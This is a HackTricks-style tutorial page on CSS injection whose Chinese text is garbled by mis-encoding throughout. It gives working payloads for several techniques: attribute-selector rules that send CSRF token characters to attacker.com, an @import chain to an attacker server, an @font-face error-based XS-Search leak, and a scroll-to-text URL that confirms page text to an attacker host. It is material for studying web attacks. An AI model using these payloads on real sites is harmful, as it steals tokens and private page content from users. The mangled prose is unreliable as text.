<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>CSS Injection</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="css-æ³¨å…¥"><a class="header" href="#css-æ³¨å…¥">CSS æ³¨å…¥</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<h2 id="css-æ³¨å…¥-1"><a class="header" href="#css-æ³¨å…¥-1">CSS æ³¨å…¥</a></h2>
<h3 id="å±æ€§é€‰æ‹©å™¨"><a class="header" href="#å±æ€§é€‰æ‹©å™¨">å±æ€§é€‰æ‹©å™¨</a></h3>
<p>CSS é€‰æ‹©å™¨è¢«è®¾è®¡ç”¨æ¥åŒ¹é… <code>input</code> å…ƒç´ çš„ <code>name</code> å’Œ <code>value</code> å±æ€§çš„å€¼ã€‚å¦‚æœè¾“å…¥å…ƒç´ çš„å€¼å±æ€§ä»¥ç‰¹å®šå­—ç¬¦å¼€å¤´ï¼Œåˆ™åŠ è½½é¢„å®šä¹‰çš„å¤–éƒ¨èµ„æºï¼š</p>
<pre><code class="language-css">input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
</code></pre>
<p>ç„¶è€Œï¼Œè¿™ç§æ–¹æ³•åœ¨å¤„ç†éšè—è¾“å…¥å…ƒç´ ï¼ˆ<code>type="hidden"</code>ï¼‰æ—¶é¢ä¸´é™åˆ¶ï¼Œå› ä¸ºéšè—å…ƒç´ ä¸åŠ è½½èƒŒæ™¯ã€‚</p>
<h4 id="ç»•è¿‡éšè—å…ƒç´ çš„é™åˆ¶"><a class="header" href="#ç»•è¿‡éšè—å…ƒç´ çš„é™åˆ¶">ç»•è¿‡éšè—å…ƒç´ çš„é™åˆ¶</a></h4>
<p>ä¸ºäº†ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ <code>~</code> ä¸€èˆ¬å…„å¼Ÿç»„åˆå™¨æ¥å®šä½åç»­å…„å¼Ÿå…ƒç´ ã€‚ç„¶åï¼ŒCSS è§„åˆ™é€‚ç”¨äºæ‰€æœ‰è·Ÿéšéšè—è¾“å…¥å…ƒç´ çš„å…„å¼Ÿå…ƒç´ ï¼Œä»è€Œå¯¼è‡´èƒŒæ™¯å›¾åƒåŠ è½½ï¼š</p>
<pre><code class="language-css">input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
</code></pre>
<p>ä¸€ä¸ªåˆ©ç”¨æ­¤æŠ€æœ¯çš„å®é™…ç¤ºä¾‹åœ¨æä¾›çš„ä»£ç ç‰‡æ®µä¸­è¯¦ç»†è¯´æ˜ã€‚æ‚¨å¯ä»¥åœ¨ <a href="https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e">è¿™é‡Œ</a> æŸ¥çœ‹ã€‚</p>
<h4 id="css-æ³¨å…¥çš„å…ˆå†³æ¡ä»¶"><a class="header" href="#css-æ³¨å…¥çš„å…ˆå†³æ¡ä»¶">CSS æ³¨å…¥çš„å…ˆå†³æ¡ä»¶</a></h4>
<p>ä¸ºäº†ä½¿ CSS æ³¨å…¥æŠ€æœ¯æœ‰æ•ˆï¼Œå¿…é¡»æ»¡è¶³æŸäº›æ¡ä»¶ï¼š</p>
<ol>
<li><strong>æœ‰æ•ˆè´Ÿè½½é•¿åº¦</strong>ï¼šCSS æ³¨å…¥å‘é‡å¿…é¡»æ”¯æŒè¶³å¤Ÿé•¿çš„æœ‰æ•ˆè´Ÿè½½ï¼Œä»¥å®¹çº³ç²¾å¿ƒåˆ¶ä½œçš„é€‰æ‹©å™¨ã€‚</li>
<li><strong>CSS é‡æ–°è¯„ä¼°</strong>ï¼šæ‚¨åº”è¯¥èƒ½å¤Ÿæ¡†æ¶é¡µé¢ï¼Œè¿™å¯¹äºè§¦å‘ä½¿ç”¨æ–°ç”Ÿæˆçš„æœ‰æ•ˆè´Ÿè½½é‡æ–°è¯„ä¼° CSS æ˜¯å¿…è¦çš„ã€‚</li>
<li><strong>å¤–éƒ¨èµ„æº</strong>ï¼šè¯¥æŠ€æœ¯å‡è®¾èƒ½å¤Ÿä½¿ç”¨å¤–éƒ¨æ‰˜ç®¡çš„å›¾åƒã€‚è¿™å¯èƒ½ä¼šå—åˆ°ç½‘ç«™å†…å®¹å®‰å…¨ç­–ç•¥ (CSP) çš„é™åˆ¶ã€‚</li>
</ol>
<h3 id="ç›²å±æ€§é€‰æ‹©å™¨"><a class="header" href="#ç›²å±æ€§é€‰æ‹©å™¨">ç›²å±æ€§é€‰æ‹©å™¨</a></h3>
<p>æ­£å¦‚ <a href="https://portswigger.net/research/blind-css-exfiltration"><strong>åœ¨è¿™ç¯‡æ–‡ç« ä¸­è§£é‡Šçš„</strong></a>ï¼Œå¯ä»¥ç»“åˆé€‰æ‹©å™¨ <strong><code>:has</code></strong> å’Œ <strong><code>:not</code></strong> æ¥è¯†åˆ«ç›²å…ƒç´ ä¸­çš„å†…å®¹ã€‚è¿™åœ¨æ‚¨ä¸çŸ¥é“åŠ è½½ CSS æ³¨å…¥çš„ç½‘é¡µå†…éƒ¨å†…å®¹æ—¶éå¸¸æœ‰ç”¨ã€‚<br />
è¿˜å¯ä»¥ä½¿ç”¨è¿™äº›é€‰æ‹©å™¨ä»å¤šä¸ªç›¸åŒç±»å‹çš„å—ä¸­æå–ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="language-html">&lt;style&gt;
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
&lt;/style&gt;
&lt;input name=mytoken value=1337&gt;
&lt;input name=myname value=gareth&gt;
</code></pre>
<p>ç»“åˆä»¥ä¸‹çš„ <strong>@import</strong> æŠ€æœ¯ï¼Œå¯ä»¥é€šè¿‡ <strong>blind-css-exfiltration</strong> ä»ç›²é¡µä¸­æå–å¤§é‡ <strong>ä¿¡æ¯</strong>ã€‚</p>
<h3 id="import"><a class="header" href="#import">@import</a></h3>
<p>ä¹‹å‰çš„æŠ€æœ¯æœ‰ä¸€äº›ç¼ºç‚¹ï¼Œè¯·æ£€æŸ¥å…ˆå†³æ¡ä»¶ã€‚æ‚¨è¦ä¹ˆéœ€è¦èƒ½å¤Ÿ <strong>å‘å—å®³è€…å‘é€å¤šä¸ªé“¾æ¥</strong>ï¼Œè¦ä¹ˆéœ€è¦èƒ½å¤Ÿ <strong>iframe CSS æ³¨å…¥æ¼æ´é¡µé¢</strong>ã€‚</p>
<p>ç„¶è€Œï¼Œè¿˜æœ‰å¦ä¸€ç§å·§å¦™çš„æŠ€æœ¯ï¼Œä½¿ç”¨ <strong>CSS <code>@import</code></strong> æ¥æé«˜æŠ€æœ¯çš„è´¨é‡ã€‚</p>
<p>è¿™é¦–å…ˆç”± <a href="https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf"><strong>Pepe Vila</strong></a> å±•ç¤ºï¼Œå…¶å·¥ä½œåŸç†å¦‚ä¸‹ï¼š</p>
<p>æˆ‘ä»¬å°† <strong>åªåŠ è½½ä¸€æ¬¡é¡µé¢ï¼Œå¹¶ä»…é€šè¿‡å¯¼å…¥åˆ°æ”»å‡»è€…æœåŠ¡å™¨</strong>ï¼ˆè¿™æ˜¯å‘é€ç»™å—å®³è€…çš„æœ‰æ•ˆè½½è·ï¼‰ã€‚</p>
<pre><code class="language-css">@import url('//attacker.com:5001/start?');
</code></pre>
<ol>
<li>å¯¼å…¥å°†ä¼š<strong>æ¥æ”¶ä¸€äº›æ¥è‡ªæ”»å‡»è€…çš„CSSè„šæœ¬</strong>ï¼Œå¹¶ä¸”<strong>æµè§ˆå™¨å°†åŠ è½½å®ƒ</strong>ã€‚</li>
<li>æ”»å‡»è€…å‘é€çš„CSSè„šæœ¬çš„ç¬¬ä¸€éƒ¨åˆ†æ˜¯<strong>å¦ä¸€ä¸ª<code>@import</code>åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨</strong>ã€‚</li>
<li>æ”»å‡»è€…çš„æœåŠ¡å™¨ä¸ä¼šç«‹å³å“åº”è¿™ä¸ªè¯·æ±‚ï¼Œå› ä¸ºæˆ‘ä»¬æƒ³è¦æ³„éœ²ä¸€äº›å­—ç¬¦ï¼Œç„¶åç”¨æœ‰æ•ˆè½½è·å“åº”è¿™ä¸ªå¯¼å…¥ä»¥æ³„éœ²ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚</li>
<li>æœ‰æ•ˆè½½è·çš„ç¬¬äºŒéƒ¨åˆ†å’Œæ›´å¤§éƒ¨åˆ†å°†æ˜¯ä¸€ä¸ª<strong>å±æ€§é€‰æ‹©å™¨æ³„éœ²æœ‰æ•ˆè½½è·</strong>ã€‚</li>
<li>è¿™å°†å‘æ”»å‡»è€…çš„æœåŠ¡å™¨å‘é€<strong>ç§˜å¯†çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å’Œæœ€åä¸€ä¸ªå­—ç¬¦</strong>ã€‚</li>
<li>ä¸€æ—¦æ”»å‡»è€…çš„æœåŠ¡å™¨æ¥æ”¶åˆ°<strong>ç§˜å¯†çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªå­—ç¬¦</strong>ï¼Œå®ƒå°†<strong>å“åº”æ­¥éª¤2ä¸­è¯·æ±‚çš„å¯¼å…¥</strong>ã€‚</li>
<li>å“åº”å°†ä¸<strong>æ­¥éª¤2ã€3å’Œ4</strong>å®Œå…¨ç›¸åŒï¼Œä½†è¿™æ¬¡å®ƒå°†å°è¯•<strong>æ‰¾åˆ°ç§˜å¯†çš„ç¬¬äºŒä¸ªå­—ç¬¦ï¼Œç„¶åæ˜¯å€’æ•°ç¬¬äºŒä¸ª</strong>ã€‚</li>
</ol>
<p>æ”»å‡»è€…å°†<strong>éµå¾ªè¿™ä¸ªå¾ªç¯ï¼Œç›´åˆ°å®Œå…¨æ³„éœ²ç§˜å¯†</strong>ã€‚</p>
<p>æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°åŸå§‹çš„<a href="https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231"><strong>Pepe Vilaçš„ä»£ç æ¥åˆ©ç”¨è¿™ä¸ª</strong></a>ï¼Œæˆ–è€…æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°å‡ ä¹<a href="./#css-injection"><strong>ç›¸åŒçš„ä»£ç ä½†å¸¦æœ‰æ³¨é‡Š</strong>ã€‚</a></p>
<p>{% hint style="info" %}
è¯¥è„šæœ¬å°†å°è¯•æ¯æ¬¡å‘ç°2ä¸ªå­—ç¬¦ï¼ˆä»å¼€å¤´å’Œç»“å°¾ï¼‰ï¼Œå› ä¸ºå±æ€§é€‰æ‹©å™¨å…è®¸æ‰§è¡Œç±»ä¼¼çš„æ“ä½œï¼š</p>
<pre><code class="language-css">/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
</code></pre>
<p>è¿™å…è®¸è„šæœ¬æ›´å¿«åœ°æ³„éœ²ç§˜å¯†ã€‚
{% endhint %}</p>
<p>{% hint style="warning" %}
æœ‰æ—¶è„šæœ¬<strong>æ— æ³•æ­£ç¡®æ£€æµ‹åˆ°å‘ç°çš„å‰ç¼€ + åç¼€å·²ç»æ˜¯å®Œæ•´çš„æ ‡å¿—</strong>ï¼Œå®ƒä¼šç»§ç»­å‘å‰ï¼ˆåœ¨å‰ç¼€ä¸­ï¼‰å’Œå‘åï¼ˆåœ¨åç¼€ä¸­ï¼‰è¿›è¡Œï¼Œå¹¶åœ¨æŸä¸ªæ—¶åˆ»ä¼šæŒ‚èµ·ã€‚<br />
ä¸ç”¨æ‹…å¿ƒï¼Œåªéœ€æ£€æŸ¥<strong>è¾“å‡º</strong>ï¼Œå› ä¸º<strong>ä½ å¯ä»¥åœ¨é‚£é‡Œçœ‹åˆ°æ ‡å¿—</strong>ã€‚
{% endhint %}</p>
<h3 id="å…¶ä»–é€‰æ‹©å™¨"><a class="header" href="#å…¶ä»–é€‰æ‹©å™¨">å…¶ä»–é€‰æ‹©å™¨</a></h3>
<p>ä½¿ç”¨<strong>CSSé€‰æ‹©å™¨</strong>è®¿é—®DOMéƒ¨åˆ†çš„å…¶ä»–æ–¹æ³•ï¼š</p>
<ul>
<li><strong><code>.class-to-search:nth-child(2)</code></strong>ï¼šè¿™å°†æœç´¢DOMä¸­ç±»ä¸º"class-to-search"çš„ç¬¬äºŒä¸ªé¡¹ç›®ã€‚</li>
<li>**<code>:empty</code>**é€‰æ‹©å™¨ï¼šä¾‹å¦‚åœ¨<a href="https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker"><strong>è¿™ç¯‡æ–‡ç« </strong></a><strong>ä¸­ä½¿ç”¨ï¼š</strong></li>
</ul>
<pre><code class="language-css">[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
</code></pre>
<h3 id="åŸºäºé”™è¯¯çš„xs-search"><a class="header" href="#åŸºäºé”™è¯¯çš„xs-search">åŸºäºé”™è¯¯çš„XS-Search</a></h3>
<p><strong>å‚è€ƒï¼š</strong> <a href="https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html">åŸºäºCSSçš„æ”»å‡»ï¼šæ»¥ç”¨@font-faceçš„unicode-range</a>ï¼Œ<a href="https://twitter.com/terjanq/status/1180477124861407234">åŸºäºé”™è¯¯çš„XS-Search PoCç”±@terjanqæä¾›</a></p>
<p>æ€»ä½“æ„å›¾æ˜¯<strong>ä½¿ç”¨æ¥è‡ªå—æ§ç«¯ç‚¹çš„è‡ªå®šä¹‰å­—ä½“</strong>ï¼Œå¹¶ç¡®ä¿<strong>æ–‡æœ¬ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ä¸º'A'ï¼‰ä»…åœ¨æŒ‡å®šèµ„æºï¼ˆ<code>favicon.ico</code>ï¼‰æ— æ³•åŠ è½½æ—¶ä½¿ç”¨æ­¤å­—ä½“æ˜¾ç¤º</strong>ã€‚</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;style&gt;
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;object id="poc0" data="http://192.168.0.1/favicon.ico"&gt;A&lt;/object&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<ol>
<li><strong>è‡ªå®šä¹‰å­—ä½“ä½¿ç”¨</strong>ï¼š</li>
</ol>
<ul>
<li>ä½¿ç”¨ <code>&lt;style&gt;</code> æ ‡ç­¾åœ¨ <code>&lt;head&gt;</code> éƒ¨åˆ†å®šä¹‰è‡ªå®šä¹‰å­—ä½“ï¼Œè§„åˆ™ä¸º <code>@font-face</code>ã€‚</li>
<li>å­—ä½“å‘½åä¸º <code>poc</code>ï¼Œå¹¶ä»å¤–éƒ¨ç«¯ç‚¹è·å–ï¼ˆ<code>http://attacker.com/?leak</code>ï¼‰ã€‚</li>
<li><code>unicode-range</code> å±æ€§è®¾ç½®ä¸º <code>U+0041</code>ï¼Œç›®æ ‡æ˜¯ç‰¹å®šçš„ Unicode å­—ç¬¦ 'A'ã€‚</li>
</ul>
<ol start="2">
<li><strong>å¸¦æœ‰åå¤‡æ–‡æœ¬çš„å¯¹è±¡å…ƒç´ </strong>ï¼š</li>
</ol>
<ul>
<li>åœ¨ <code>&lt;body&gt;</code> éƒ¨åˆ†åˆ›å»ºä¸€ä¸ª <code>id="poc0"</code> çš„ <code>&lt;object&gt;</code> å…ƒç´ ã€‚è¯¥å…ƒç´ å°è¯•ä» <code>http://192.168.0.1/favicon.ico</code> åŠ è½½èµ„æºã€‚</li>
<li>æ­¤å…ƒç´ çš„ <code>font-family</code> è®¾ç½®ä¸ºåœ¨ <code>&lt;style&gt;</code> éƒ¨åˆ†å®šä¹‰çš„ <code>'poc'</code>ã€‚</li>
<li>å¦‚æœèµ„æºï¼ˆ<code>favicon.ico</code>ï¼‰åŠ è½½å¤±è´¥ï¼Œåˆ™åœ¨ <code>&lt;object&gt;</code> æ ‡ç­¾å†…æ˜¾ç¤ºåå¤‡å†…å®¹ï¼ˆå­—æ¯ 'A'ï¼‰ã€‚</li>
<li>å¦‚æœæ— æ³•åŠ è½½å¤–éƒ¨èµ„æºï¼Œåå¤‡å†…å®¹ï¼ˆ'A'ï¼‰å°†ä½¿ç”¨è‡ªå®šä¹‰å­—ä½“ <code>poc</code> æ¸²æŸ“ã€‚</li>
</ul>
<h3 id="æ ·å¼æ»šåŠ¨åˆ°æ–‡æœ¬ç‰‡æ®µ"><a class="header" href="#æ ·å¼æ»šåŠ¨åˆ°æ–‡æœ¬ç‰‡æ®µ">æ ·å¼æ»šåŠ¨åˆ°æ–‡æœ¬ç‰‡æ®µ</a></h3>
<p><strong><code>:target</code></strong> ä¼ªç±»ç”¨äºé€‰æ‹©ç”± <strong>URL ç‰‡æ®µ</strong> å®šä½çš„å…ƒç´ ï¼Œå¦‚ <a href="https://drafts.csswg.org/selectors-4/#the-target-pseudo">CSS é€‰æ‹©å™¨ç¬¬ 4 çº§è§„èŒƒ</a> ä¸­æ‰€è¿°ã€‚é‡è¦çš„æ˜¯è¦ç†è§£ï¼Œ<code>::target-text</code> åªæœ‰åœ¨æ–‡æœ¬è¢«ç‰‡æ®µæ˜ç¡®å®šä½æ—¶æ‰ä¼šåŒ¹é…ä»»ä½•å…ƒç´ ã€‚</p>
<p>å½“æ”»å‡»è€…åˆ©ç”¨ <strong>æ»šåŠ¨åˆ°æ–‡æœ¬</strong> ç‰‡æ®µåŠŸèƒ½æ—¶ï¼Œä¼šå‡ºç°å®‰å…¨éšæ‚£ï¼Œè¿™ä½¿ä»–ä»¬èƒ½å¤Ÿé€šè¿‡ HTML æ³¨å…¥ä»å…¶æœåŠ¡å™¨åŠ è½½èµ„æºï¼Œä»¥ç¡®è®¤ç½‘é¡µä¸Šç‰¹å®šæ–‡æœ¬çš„å­˜åœ¨ã€‚è¯¥æ–¹æ³•æ¶‰åŠæ³¨å…¥å¦‚ä¸‹ CSS è§„åˆ™ï¼š</p>
<pre><code class="language-css">:target::before { content : url(target.png) }
</code></pre>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœé¡µé¢ä¸Šå­˜åœ¨æ–‡æœ¬â€œAdministratorâ€ï¼Œåˆ™ä¼šä»æœåŠ¡å™¨è¯·æ±‚èµ„æº <code>target.png</code>ï¼Œè¿™è¡¨æ˜è¯¥æ–‡æœ¬çš„å­˜åœ¨ã€‚æ­¤æ”»å‡»çš„ä¸€ä¸ªå®ä¾‹å¯ä»¥é€šè¿‡ä¸€ä¸ªç‰¹æ®Šæ„é€ çš„ URL æ‰§è¡Œï¼Œè¯¥ URL åµŒå…¥äº†æ³¨å…¥çš„ CSS ä»¥åŠä¸€ä¸ª Scroll-to-text ç‰‡æ®µï¼š</p>
<pre><code>http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
</code></pre>
<p>è¿™é‡Œï¼Œæ”»å‡»åˆ©ç”¨HTMLæ³¨å…¥æ¥ä¼ è¾“CSSä»£ç ï¼Œé’ˆå¯¹ç‰¹å®šæ–‡æœ¬â€œAdministratorâ€é€šè¿‡Scroll-to-text fragmentï¼ˆ<code>#:~:text=Administrator</code>ï¼‰ã€‚å¦‚æœæ‰¾åˆ°è¯¥æ–‡æœ¬ï¼ŒæŒ‡ç¤ºçš„èµ„æºå°†è¢«åŠ è½½ï¼Œæ— æ„ä¸­å‘æ”»å‡»è€…å‘å‡ºå…¶å­˜åœ¨çš„ä¿¡å·ã€‚</p>
<p>ä¸ºäº†ç¼“è§£ï¼Œä»¥ä¸‹å‡ ç‚¹åº”æ³¨æ„ï¼š</p>
<ol>
<li><strong>å—é™çš„STTFåŒ¹é…</strong>ï¼šScroll-to-text Fragmentï¼ˆSTTFï¼‰æ—¨åœ¨ä»…åŒ¹é…å•è¯æˆ–å¥å­ï¼Œä»è€Œé™åˆ¶å…¶æ³„éœ²ä»»æ„ç§˜å¯†æˆ–ä»¤ç‰Œçš„èƒ½åŠ›ã€‚</li>
<li><strong>é™åˆ¶åœ¨é¡¶çº§æµè§ˆä¸Šä¸‹æ–‡ä¸­</strong>ï¼šSTTFä»…åœ¨é¡¶çº§æµè§ˆä¸Šä¸‹æ–‡ä¸­æ“ä½œï¼Œä¸åœ¨iframeå†…å·¥ä½œï¼Œä½¿ä»»ä½•åˆ©ç”¨å°è¯•å¯¹ç”¨æˆ·æ›´æ˜æ˜¾ã€‚</li>
<li><strong>ç”¨æˆ·æ¿€æ´»çš„å¿…è¦æ€§</strong>ï¼šSTTFéœ€è¦ç”¨æˆ·æ¿€æ´»æ‰‹åŠ¿æ‰èƒ½æ“ä½œï¼Œè¿™æ„å‘³ç€åˆ©ç”¨ä»…é€šè¿‡ç”¨æˆ·å‘èµ·çš„å¯¼èˆªæ‰å¯è¡Œã€‚è¿™ä¸€è¦æ±‚å¤§å¤§é™ä½äº†æ”»å‡»åœ¨æ²¡æœ‰ç”¨æˆ·äº¤äº’çš„æƒ…å†µä¸‹è‡ªåŠ¨åŒ–çš„é£é™©ã€‚ç„¶è€Œï¼Œåšå®¢ä½œè€…æŒ‡å‡ºäº†ç‰¹å®šæ¡ä»¶å’Œç»•è¿‡æ–¹æ³•ï¼ˆä¾‹å¦‚ï¼Œç¤¾ä¼šå·¥ç¨‹å­¦ï¼Œä¸æµè¡Œæµè§ˆå™¨æ‰©å±•çš„äº¤äº’ï¼‰ï¼Œå¯èƒ½ä¼šé™ä½æ”»å‡»çš„è‡ªåŠ¨åŒ–éš¾åº¦ã€‚</li>
</ol>
<p>äº†è§£è¿™äº›æœºåˆ¶å’Œæ½œåœ¨æ¼æ´å¯¹äºç»´æŠ¤ç½‘ç»œå®‰å…¨å’Œé˜²èŒƒæ­¤ç±»åˆ©ç”¨ç­–ç•¥è‡³å…³é‡è¦ã€‚</p>
<p>æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹åŸå§‹æŠ¥å‘Šï¼š<a href="https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/">https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/</a></p>
